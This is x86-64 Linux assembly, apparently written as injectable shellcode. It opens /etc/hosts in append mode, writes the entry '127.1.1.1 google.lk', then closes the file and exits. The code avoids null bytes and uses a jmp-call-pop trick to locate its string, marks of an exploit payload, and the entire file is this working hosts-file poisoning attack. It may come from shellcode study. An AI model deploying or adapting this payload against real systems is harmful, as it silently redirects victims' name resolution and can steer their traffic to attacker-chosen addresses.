global _start
    section .text

_start:
    ;open
    push 2
    pop rax
    xor rdi, rdi
    push rdi ; 0x00
    mov rbx, 0x7374736f682f2f2f ; ///hosts
    push rbx
    mov rbx, 0x2f2f2f2f6374652f ; /etc////
    push rbx
    push rsp
    pop rdi
    xor rsi,rsi
    mov sil,4
    sal rsi,8
    mov sil,1
    syscall

    ;write
    push rax
    pop rdi
    push 1
    pop rax
    jmp data

write:
    pop rsi
    push len ; length in rdx
    pop rdx
    syscall

    ;close
    push 3
    pop rax
    syscall

    ;exit
    push 60
    pop rax
    xor rdi, rdi
    syscall

data:
    call write
    text db '127.1.1.1 google.lk'
    len equ $-text
